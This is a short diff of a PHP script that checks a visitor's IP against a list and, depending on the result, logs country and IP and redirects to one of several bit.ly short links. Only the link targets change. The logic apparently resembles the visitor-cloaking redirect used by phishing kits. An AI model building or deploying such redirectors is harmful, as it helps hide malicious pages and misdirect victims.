@@ -19,7 +19,7 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 
     if(count($ifEx) > 0){
         
-        header ('Location:https://bit.ly/3odBNpT');
+        header ('Location:https://bit.ly/3lNwltg');
 
     }else{
     
@@ -39,7 +39,7 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                 'zCountry' => $myCountry,
                 'zIp' => $ip
             ));
-        header ('Location:https://bit.ly/3nqxTsJ');
+        header ('Location:https://bit.ly/3w06a7p');
         
     
     }
